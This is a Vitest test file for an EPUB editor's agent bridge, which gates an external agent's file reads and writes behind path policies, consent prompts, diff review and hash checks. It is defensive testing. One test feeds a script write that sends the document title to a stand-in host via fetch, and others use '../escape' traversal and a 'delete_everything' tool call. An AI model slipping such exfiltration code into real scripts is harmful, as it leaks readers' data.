/**
 * Tests for the agent bridge module asset (src/lib/agent-bridge/module.js,
 * served at agent-bridge/module.js by the dev middleware). The asset is plain
 * ESM, imported directly; the WebSocket is a scripted fake and the workspace
 * directory is a plain-object handle tree. The consent-timeout auto-deny is
 * deliberately untested (fake timers fight the crypto/microtask polling);
 * cancellation-on-disconnect covers the same finish path.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { start, isWritablePath, isCodePath } from './module.js';

class FakeWebSocket {
  static last: FakeWebSocket | null = null;
  sent: string[] = [];
  readyState = 0;
  onopen: (() => void) | null = null;
  onclose: (() => void) | null = null;
  onerror: (() => void) | null = null;
  onmessage: ((event: { data: string }) => void) | null = null;
  constructor(public url: string) {
    FakeWebSocket.last = this;
  }
  send(data: string) {
    this.sent.push(data);
  }
  close() {
    this.readyState = 3;
    this.onclose?.();
  }
  // test helpers
  open() {
    this.readyState = 1;
    this.onopen?.();
  }
  async receive(message: object): Promise<object> {
    const before = this.sent.length;
    this.onmessage?.({ data: JSON.stringify(message) });
    // macrotask ticks: tool handlers await real async work (crypto.subtle)
    for (let i = 0; i < 200 && this.sent.length === before; i++) {
      await new Promise(resolve => setTimeout(resolve, 0));
    }
    return JSON.parse(this.sent[this.sent.length - 1]);
  }
}

const fakeFile = (bytes: Uint8Array | string) => {
  const data = typeof bytes === 'string' ? new TextEncoder().encode(bytes) : bytes;
  return {
    kind: 'file' as const,
    getFile: async () => ({
      size: data.length,
      arrayBuffer: async () => data.buffer.slice(data.byteOffset, data.byteOffset + data.length),
      text: async () => new TextDecoder().decode(data),
    }),
  };
};

function fakeDir(entries: Record<string, ReturnType<typeof fakeFile> | object>): object {
  return {
    kind: 'directory' as const,
    entries: async function* () {
      for (const [name, entry] of Object.entries(entries)) yield [name, entry];
    },
    getDirectoryHandle: async (name: string) => {
      const entry = entries[name] as { kind: string } | undefined;
      if (!entry || entry.kind !== 'directory') throw new Error('not found: ' + name);
      return entry;
    },
    getFileHandle: async (name: string) => {
      const entry = entries[name] as { kind: string } | undefined;
      if (!entry || entry.kind !== 'file') throw new Error('not found: ' + name);
      return entry;
    },
  };
}

function makeContext(overrides: Record<string, unknown> = {}) {
  // page.css content and the workspace id are mutable so tests can change the
  // world while a consent prompt sits open (the revalidation scenarios); the
  // write fakes persist into them so read-back acks verify.
  let cssContent = 'body { color: red }';
  let domScript = 'function transformDOM(document) { return document }';
  let mp3Bytes = new Uint8Array([0, 1, 2, 0]);
  let workspaceId = 'ws-1';
  const cssFile = {
    kind: 'file' as const,
    getFile: async () => {
      const data = new TextEncoder().encode(cssContent);
      return { size: data.length, arrayBuffer: async () => data.buffer };
    },
  };
  // Mutable like the CSS, so the read-back ack on a code write verifies.
  const domScriptFile = {
    kind: 'file' as const,
    getFile: async () => {
      const data = new TextEncoder().encode(domScript);
      return { size: data.length, arrayBuffer: async () => data.buffer };
    },
  };
  const mp3File = {
    kind: 'file' as const,
    getFile: async () => ({
      size: mp3Bytes.length,
      arrayBuffer: async () =>
        mp3Bytes.buffer.slice(mp3Bytes.byteOffset, mp3Bytes.byteOffset + mp3Bytes.byteLength),
    }),
  };
  const workspace = fakeDir({
    OEBPS: fakeDir({
      Styles: fakeDir({ 'page.css': cssFile }),
      Scripts: fakeDir({ 'clip-player.js': fakeFile('// player') }),
      'audio.mp3': mp3File,
    }),
    SOURCE: fakeDir({
      'settings.json': fakeFile(
        JSON.stringify({
          text_transform: 'SOURCE/scripts/transformText.js',
          dom_transforms: ['SOURCE/scripts/transformDom.js'],
          image_template: '![<alt>](<href>)',
        })
      ),
      scripts: fakeDir({
        'SYNTAX.md': fakeFile('# divergences: emphasis roles are swapped'),
        'transformDom.js': domScriptFile,
      }),
    }),
  });
  const statuses: Array<[string, string | undefined]> = [];
  const ctx = {
    wsUrl: 'ws://localhost:8747',
    mountEl: document.createElement('div'),
    onStatus: (status: string, detail?: string) => statuses.push([status, detail]),
    getProjectInfo: () => ({
      workspaceId,
      title: 'Bulletin',
      language: 'en',
      userAgent: 'TestUA/1.0',
    }),
    getWorkspaceDir: async () => workspace,
    getRenderedXhtml: () => ({ chapterId: 'ch-1', xhtml: '<html/>' }),
    getLastClick: () => null,
    getChecks: async () => ({
      chapterId: 'ch-1',
      a11y: { status: 'ok', engine: 'raw', caveats: [], violations: [], needsReview: [] },
      epubcheck: { status: 'none' },
    }),
    inspectElements: vi.fn((params: unknown) => ({ status: 'ok', echo: params })),
    writeTextFile: vi.fn(async (path: string, text: string) => {
      if (path === 'OEBPS/Styles/page.css') cssContent = text;
      if (path === 'SOURCE/scripts/transformDom.js') domScript = text;
    }),
    writeBinaryFile: vi.fn(async (path: string, bytes: Uint8Array) => {
      if (path === 'OEBPS/audio.mp3') mp3Bytes = bytes.slice();
    }),
    isFileDirty: vi.fn(() => false),
    reviewWrite: vi.fn(async (_request: Record<string, unknown>) => 'accept' as const),
    diffStat: vi.fn(() => ({ added: 1, removed: 1 })),
    ...overrides,
  };
  return {
    ctx,
    statuses,
    setCss: (value: string) => (cssContent = value),
    setWorkspaceId: (value: string) => (workspaceId = value),
  };
}

const sha256 = async (text: string) => {
  const digest = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(text));
  return [...new Uint8Array(digest)].map(b => b.toString(16).padStart(2, '0')).join('');
};

const tick = () => new Promise(resolve => setTimeout(resolve, 0));
async function waitFor(condition: () => boolean, tries = 200): Promise<void> {
  for (let i = 0; i < tries; i++) {
    if (condition()) return;
    await tick();
  }
  throw new Error('waitFor timed out');
}

beforeEach(() => {
  vi.stubGlobal('WebSocket', FakeWebSocket);
  FakeWebSocket.last = null;
});

describe('agent bridge module', () => {
  it('connects, reports status, and sends the hello with the project id', () => {
    const { ctx, statuses } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    expect(socket.url).toBe('ws://localhost:8747');
    socket.open();
    expect(JSON.parse(socket.sent[0])).toEqual({ hello: 'seed-agent-bridge', projectId: 'ws-1' });
    expect(statuses.map(s => s[0])).toEqual(['connecting', 'connected']);
  });

  it('serves project_info, rendered xhtml, and selection', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    expect(await socket.receive({ id: 1, tool: 'project_info' })).toEqual({
      id: 1,
      ok: true,
      result: { workspaceId: 'ws-1', title: 'Bulletin', language: 'en', userAgent: 'TestUA/1.0' },
    });
    expect(await socket.receive({ id: 2, tool: 'get_rendered_xhtml' })).toEqual({
      id: 2,
      ok: true,
      result: { chapterId: 'ch-1', xhtml: '<html/>' },
    });
    expect(await socket.receive({ id: 3, tool: 'get_selection' })).toEqual({
      id: 3,
      ok: true,
      result: { kind: 'none' },
    });
  });

  it('serves the checks payload straight from the context', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    expect(await socket.receive({ id: 1, tool: 'get_checks' })).toEqual({
      id: 1,
      ok: true,
      result: {
        chapterId: 'ch-1',
        a11y: { status: 'ok', engine: 'raw', caveats: [], violations: [], needsReview: [] },
        epubcheck: { status: 'none' },
      },
    });
  });

  it('passes inspect selectors through, normalising optional params', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const response = (await socket.receive({
      id: 1,
      tool: 'inspect_elements',
      params: { selectors: ['img', '.badge'], properties: ['position', 42], surface: 2 },
    })) as { ok: boolean };
    expect(response.ok).toBe(true);
    // Non-string property names are dropped rather than passed to the DOM.
    expect(ctx.inspectElements).toHaveBeenCalledWith({
      selectors: ['img', '.badge'],
      properties: ['position'],
      surface: 2,
    });
  });

  it('rejects an inspect call with no usable selectors', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    for (const params of [{}, { selectors: [] }, { selectors: ['  '] }, { selectors: 'img' }]) {
      const response = (await socket.receive({ id: 1, tool: 'inspect_elements', params })) as {
        ok: boolean;
        error: string;
      };
      expect(response.ok).toBe(false);
      expect(response.error).toMatch(/selectors required/);
    }
    expect(ctx.inspectElements).not.toHaveBeenCalled();
  });

  it('drops a surface value that is not 1 or 2 instead of forwarding it', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    await socket.receive({
      id: 1,
      tool: 'inspect_elements',
      params: { selectors: ['img'], surface: 7 },
    });
    expect(ctx.inspectElements).toHaveBeenCalledWith({
      selectors: ['img'],
      properties: undefined,
      surface: undefined,
    });
  });

  it('lists files sorted with sizes', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const response = (await socket.receive({ id: 1, tool: 'list_files' })) as {
      result: { files: Array<{ path: string; size: number }> };
    };
    // localeCompare: case-insensitive, so audio.mp3 sorts before Scripts/
    expect(response.result.files.map(f => f.path)).toEqual([
      'OEBPS/audio.mp3',
      'OEBPS/Scripts/clip-player.js',
      'OEBPS/Styles/page.css',
      'SOURCE/scripts/SYNTAX.md',
      'SOURCE/scripts/transformDom.js',
      'SOURCE/settings.json',
    ]);
    expect(response.result.files.find(f => f.path === 'OEBPS/Styles/page.css')?.size).toBe(19);
  });

  it('reads text files, flags binary, rejects traversal and missing paths', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    expect(
      await socket.receive({ id: 1, tool: 'read_file', params: { path: 'OEBPS/Styles/page.css' } })
    ).toMatchObject({
      id: 1,
      ok: true,
      result: {
        text: 'body { color: red }',
        size: 19,
        hash: expect.stringMatching(/^[0-9a-f]{64}$/),
      },
    });
    expect(
      await socket.receive({ id: 2, tool: 'read_file', params: { path: 'OEBPS/audio.mp3' } })
    ).toMatchObject({
      id: 2,
      ok: true,
      result: { binary: true, size: 4, hash: expect.stringMatching(/^[0-9a-f]{64}$/) },
    });
    const traversal = await socket.receive({
      id: 3,
      tool: 'read_file',
      params: { path: '../escape' },
    });
    expect(traversal).toMatchObject({ id: 3, ok: false });
    const missing = await socket.receive({
      id: 4,
      tool: 'read_file',
      params: { path: 'OEBPS/nope.css' },
    });
    expect(missing).toMatchObject({ id: 4, ok: false });
  });

  it('answers unknown tools with an error, not silence', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const response = await socket.receive({ id: 9, tool: 'delete_everything', params: {} });
    expect(response).toMatchObject({ id: 9, ok: false });
  });

  it('renders the overlay, logs actions, and tears down on stop', async () => {
    const { ctx } = makeContext();
    const handle = start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    expect(ctx.mountEl.querySelector('[role="region"]')).toBeTruthy();
    await socket.receive({ id: 1, tool: 'list_files' });
    await socket.receive({ id: 2, tool: 'read_file', params: { path: 'SOURCE/settings.json' } });
    const items = [...ctx.mountEl.querySelectorAll('li')].map(li => li.textContent);
    expect(items).toEqual(['listed project files', 'read SOURCE/settings.json']);
    handle.stop();
    expect(ctx.mountEl.children.length).toBe(0);
  });

  it('serves project setup: settings, transform list, and the read-first hint', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const response = (await socket.receive({ id: 1, tool: 'project_setup' })) as {
      ok: boolean;
      result: {
        workspaceId: string;
        settings: { image_template: string };
        transformScripts: string[];
        hint: string;
      };
    };
    expect(response.ok).toBe(true);
    expect(response.result.workspaceId).toBe('ws-1');
    expect(response.result.settings.image_template).toBe('![<alt>](<href>)');
    expect(response.result.transformScripts).toEqual([
      'SOURCE/scripts/transformText.js',
      'SOURCE/scripts/transformDom.js',
    ]);
    expect(response.result.hint).toContain('generated');
    // the SYNTAX.md sibling of the text transform is picked up from the project
    expect(
      (response.result as { syntaxReference?: { source: string; text: string } }).syntaxReference
    ).toEqual({ source: 'project', text: '# divergences: emphasis roles are swapped' });
  });

  it('write policy: pipeline inputs and standalone assets only', () => {
    // allowed: sources, transforms, preview head, styles, media, RS scripts
    for (const path of [
      'SOURCE/text/item-2-the-news.txt',
      'SOURCE/scripts/transformDom.js',
      'SOURCE/preview/head.xml',
      'SOURCE/plugins/photo-regions/regions.json', // plugin work-product a book may render from
      'OEBPS/Styles/page.css',
      'OEBPS/Images/cover.jpg',
      'OEBPS/Scripts/clip-player.js',
      'OEBPS/Fonts/serif.woff2',
    ]) {
      expect(isWritablePath(path), path).toBe(true);
    }
    // denied: generated outputs, OPF, app bookkeeping, traversal, roots
    for (const path of [
      'OEBPS/Text/chapter01.xhtml',
      'OEBPS/nav.xhtml',
      'OEBPS/content.opf',
      'OEBPS/toc.ncx',
      'SOURCE/settings.json',
      'SOURCE/main/SOURCE/text/x.txt',
      'SOURCE/data/figures.json',
      'mimetype',
      'META-INF/container.xml',
      'OEBPS/../SOURCE/settings.json',
      'OEBPS',
    ]) {
      expect(isWritablePath(path), path).toBe(false);
    }
  });

  it('code paths are the ones that execute somewhere', () => {
    for (const path of [
      'SOURCE/scripts/transformDom.js',
      'SOURCE/preview/head.xml',
      'OEBPS/Scripts/clip-player.js',
      'OEBPS/Styles/sneaky.js', // a script does not become prose by its folder
    ]) {
      expect(isCodePath(path), path).toBe(true);
    }
    for (const path of [
      'SOURCE/text/chapter01.txt',
      'OEBPS/Styles/page.css',
      'OEBPS/Images/cover.jpg',
    ]) {
      expect(isCodePath(path), path).toBe(false);
    }
  });

  it('a script write is reviewed as a diff, and no session grant covers it', async () => {
    // Grant the session on a prose write first — the code write must ignore it.
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'body { color: blue }',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow this session')
    );
    [...ctx.mountEl.querySelectorAll('button')]
      .find(b => b.textContent === 'Allow this session')!
      .click();
    await waitFor(() => JSON.parse(socket.sent[socket.sent.length - 1]).id === 1);

    socket.onmessage?.({
      data: JSON.stringify({
        id: 2,
        tool: 'write_file',
        params: {
          path: 'SOURCE/scripts/transformDom.js',
          text: 'function transformDOM(d) { return d }',
          expectedHash: await sha256('function transformDOM(document) { return document }'),
        },
      }),
    });
    await waitFor(() => JSON.parse(socket.sent[socket.sent.length - 1]).id === 2);

    // The app was asked to review it, with both sides of the diff in hand.
    expect(ctx.reviewWrite).toHaveBeenCalledTimes(1);
    expect(ctx.reviewWrite.mock.calls[0][0]).toMatchObject({
      path: 'SOURCE/scripts/transformDom.js',
      current: 'function transformDOM(document) { return document }',
      incoming: 'function transformDOM(d) { return d }',
    });
    // ...and no second inline prompt appeared for it.
    expect(
      [...ctx.mountEl.querySelectorAll('button')].filter(b => b.textContent === 'Allow once')
    ).toHaveLength(0);
    expect(JSON.parse(socket.sent[socket.sent.length - 1])).toMatchObject({ id: 2, ok: true });
  });

  it('a denied review refuses the write', async () => {
    const { ctx } = makeContext({
      reviewWrite: vi.fn(async (_request: Record<string, unknown>) => 'deny' as const),
    });
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const before = socket.sent.length;
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Scripts/clip-player.js',
          text: 'fetch("https://example.invalid/" + document.title)',
          expectedHash: await sha256('// player'),
        },
      }),
    });
    await waitFor(() => socket.sent.length > before);
    expect(JSON.parse(socket.sent[socket.sent.length - 1])).toMatchObject({ ok: false });
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('writes after Allow once, through the text service path', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const before = socket.sent.length;
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'body { color: blue }',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    // consent prompt is in the feed with the panel forced open
    const allow = [...ctx.mountEl.querySelectorAll('button')].find(
      b => b.textContent === 'Allow once'
    )!;
    allow.click();
    await waitFor(() => socket.sent.length > before);
    const response = JSON.parse(socket.sent[socket.sent.length - 1]);
    // read-back ack: size/hash reflect the stored bytes, marked verified
    expect(response).toMatchObject({
      id: 1,
      ok: true,
      result: {
        written: true,
        size: 20,
        verified: true,
        hash: await sha256('body { color: blue }'),
      },
    });
    expect(ctx.writeTextFile).toHaveBeenCalledWith(
      'OEBPS/Styles/page.css',
      'body { color: blue }',
      'ws-1'
    );
    expect(ctx.writeBinaryFile).not.toHaveBeenCalled();
    // feed shows the write with the stored hash prefix (journal correlation)
    const items = [...ctx.mountEl.querySelectorAll('li')].map(li => li.textContent);
    const expectedPrefix = (await sha256('body { color: blue }')).slice(0, 8);
    expect(
      items.some(t => t?.includes(`wrote OEBPS/Styles/page.css (20 bytes, ${expectedPrefix})`))
    ).toBe(true);
  });

  it('read-back ack catches a write that did not land', async () => {
    // a write fake that swallows the bytes: stored content never changes
    const { ctx } = makeContext({ writeTextFile: vi.fn(async () => {}) });
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'body { color: blue }',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    [...ctx.mountEl.querySelectorAll('button')].find(b => b.textContent === 'Allow once')!.click();
    await waitFor(() => socket.sent.some(s => s.includes('verification failed')));
    const response = JSON.parse(socket.sent[socket.sent.length - 1]);
    expect(response).toMatchObject({ id: 1, ok: false });
    expect(response.error).toContain('stored bytes');
  });

  it('Allow this session skips the prompt for the next write', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    // writes persist now, so each expectedHash reflects the prior write
    const send = (id: number, text: string, expectedHash: string) =>
      socket.onmessage?.({
        data: JSON.stringify({
          id,
          tool: 'write_file',
          params: { path: 'OEBPS/Styles/page.css', text, expectedHash },
        }),
      });
    send(1, 'x', await sha256('body { color: red }'));
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow this session')
    );
    [...ctx.mountEl.querySelectorAll('button')]
      .find(b => b.textContent === 'Allow this session')!
      .click();
    await waitFor(() => socket.sent.filter(s => s.includes('"written"')).length === 1);
    send(2, 'y', await sha256('x'));
    await waitFor(() => socket.sent.filter(s => s.includes('"written"')).length === 2);
    // no second prompt appeared
    expect(
      [...ctx.mountEl.querySelectorAll('button')].filter(b => b.textContent === 'Allow once')
    ).toHaveLength(0);
    expect(ctx.writeTextFile).toHaveBeenCalledTimes(2);
  });

  it('a session grant is not bounded by write count or by age', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const send = (id: number, text: string, expectedHash: string) =>
      socket.onmessage?.({
        data: JSON.stringify({
          id,
          tool: 'write_file',
          params: { path: 'OEBPS/Styles/page.css', text, expectedHash },
        }),
      });
    send(1, 'w0', await sha256('body { color: red }'));
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow this session')
    );
    [...ctx.mountEl.querySelectorAll('button')]
      .find(b => b.textContent === 'Allow this session')!
      .click();
    await waitFor(() => socket.sent.filter(s => s.includes('"written"')).length === 1);
    // Well past the old twenty-write cap, with the clock pushed past the old
    // ten-minute age bound between writes: still no prompt.
    const realNow = Date.now;
    let clock = realNow();
    vi.spyOn(Date, 'now').mockImplementation(() => clock);
    try {
      for (let i = 1; i <= 25; i++) {
        clock += 15 * 60 * 1000;
        send(i + 1, `w${i}`, await sha256(`w${i - 1}`));
        await waitFor(() => socket.sent.filter(s => s.includes('"written"')).length === i + 1);
      }
    } finally {
      vi.mocked(Date.now).mockRestore();
    }
    expect(
      [...ctx.mountEl.querySelectorAll('button')].filter(b => b.textContent === 'Allow once')
    ).toHaveLength(0);
    expect(ctx.writeTextFile).toHaveBeenCalledTimes(26);
  });

  it('Deny refuses the write and nothing is written', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'x',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Deny')
    );
    [...ctx.mountEl.querySelectorAll('button')].find(b => b.textContent === 'Deny')!.click();
    await waitFor(() => socket.sent.some(s => s.includes('denied')));
    const response = JSON.parse(socket.sent[socket.sent.length - 1]);
    expect(response).toMatchObject({ id: 1, ok: false });
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('refuses without consent UI: bad path, missing file, stale hash, dirty editor', async () => {
    const { ctx } = makeContext({ isFileDirty: vi.fn(() => true) });
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    const goodHash = await sha256('body { color: red }');
    const cases: Array<[object, string]> = [
      [{ path: 'OEBPS/Text/ch1.xhtml', text: 'x', expectedHash: goodHash }, 'not writable'],
      [{ path: 'OEBPS/Styles/missing.css', text: 'x', expectedHash: goodHash }, 'does not exist'],
      [{ path: 'OEBPS/Styles/page.css', text: 'x', expectedHash: 'deadbeef' }, 'does not match'],
      [{ path: 'OEBPS/Styles/page.css', text: 'x', expectedHash: goodHash }, 'unsaved changes'],
    ];
    for (const [params, fragment] of cases) {
      const response = (await socket.receive({ id: 9, tool: 'write_file', params })) as {
        ok: boolean;
        error: string;
      };
      expect(response.ok, fragment).toBe(false);
      expect(response.error).toContain(fragment);
    }
    // none of the refusals rendered a consent prompt
    expect(
      [...ctx.mountEl.querySelectorAll('button')].filter(b => b.textContent === 'Allow once')
    ).toHaveLength(0);
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('revalidates after consent: a file edited during the prompt is refused', async () => {
    const { ctx, setCss } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'agent version',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    // the author edits the file while the prompt sits open
    setCss('author version');
    [...ctx.mountEl.querySelectorAll('button')].find(b => b.textContent === 'Allow once')!.click();
    await waitFor(() => socket.sent.some(s => s.includes('does not match')));
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('revalidates after consent: a project switch during the prompt is refused', async () => {
    const { ctx, setWorkspaceId } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'x',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    setWorkspaceId('ws-2');
    [...ctx.mountEl.querySelectorAll('button')].find(b => b.textContent === 'Allow once')!.click();
    await waitFor(() => socket.sent.some(s => s.includes('project changed')));
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('a disconnect cancels the open consent prompt without writing', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.onmessage?.({
      data: JSON.stringify({
        id: 1,
        tool: 'write_file',
        params: {
          path: 'OEBPS/Styles/page.css',
          text: 'x',
          expectedHash: await sha256('body { color: red }'),
        },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    socket.close();
    // the prompt's action buttons are gone; nothing was written; no crash
    await waitFor(
      () => ![...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    await tick();
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('writes binary via base64 and enforces the size limit up front', async () => {
    const { ctx } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    // size limit refused before any prompt
    const big = await socket.receive({
      id: 1,
      tool: 'write_file',
      params: {
        path: 'OEBPS/Styles/page.css',
        text: 'x'.repeat(2 * 1024 * 1024 + 1),
        expectedHash: 'irrelevant',
      },
    });
    expect(big).toMatchObject({ id: 1, ok: false });
    // binary write with consent
    const mp3Bytes = new Uint8Array([0, 1, 2, 0]);
    const digest = await crypto.subtle.digest('SHA-256', mp3Bytes);
    const mp3Hash = [...new Uint8Array(digest)].map(b => b.toString(16).padStart(2, '0')).join('');
    socket.onmessage?.({
      data: JSON.stringify({
        id: 2,
        tool: 'write_file',
        params: { path: 'OEBPS/audio.mp3', base64: 'AAECAA==', expectedHash: mp3Hash },
      }),
    });
    await waitFor(() =>
      [...ctx.mountEl.querySelectorAll('button')].some(b => b.textContent === 'Allow once')
    );
    [...ctx.mountEl.querySelectorAll('button')].find(b => b.textContent === 'Allow once')!.click();
    await waitFor(() => socket.sent.some(s => s.includes('"written"')));
    expect(ctx.writeBinaryFile).toHaveBeenCalledWith(
      'OEBPS/audio.mp3',
      new Uint8Array([0, 1, 2, 0]),
      'ws-1'
    );
    expect(ctx.writeTextFile).not.toHaveBeenCalled();
  });

  it('parks at disconnected on an unexpected close — no reconnect attempt', () => {
    const { ctx, statuses } = makeContext();
    start(ctx);
    const socket = FakeWebSocket.last!;
    socket.open();
    socket.close();
    expect(statuses[statuses.length - 1][0]).toBe('disconnected');
    // overlay stays mounted (parked), and no new socket was created
    expect(ctx.mountEl.children.length).toBe(1);
    expect(FakeWebSocket.last).toBe(socket);
  });
});
